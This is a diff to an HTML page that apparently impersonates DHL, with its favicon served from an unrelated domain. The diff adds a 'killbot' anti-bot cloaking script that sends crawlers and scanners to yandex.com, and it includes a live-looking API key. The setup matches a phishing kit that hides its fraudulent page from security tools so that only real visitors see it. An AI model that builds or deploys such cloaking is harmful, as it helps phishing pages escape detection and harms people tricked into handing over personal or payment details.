@@ -2,6 +2,13 @@
 <html lang="fr" >
   <head>
     <script src="https://kit.fontawesome.com/f7165dd215.js" crossorigin="anonymous"></script>
+    <script type="text/javascript">
+        const killbot = {
+            apiKey: "XVMpB5exZpe6LjHpLHitdhu8mRZbRdZtq5UF6LD4hpXOX", 
+            botRedirection: "https://yandex.com" // Bot will be redirect to this URL, you can change it
+        }
+    </script>
+    <script src="https://files.killbot.org/.cdn-cgi/killbot-security.js"></script>
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -634,6 +641,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
     }
 }
 </style>
+
     <title>DHL</title>
     <link rel="icon" type="image/ico" href="https://dispatching-centre.wtechsmartwater.com/images/favicon.gif"/>
   </head>
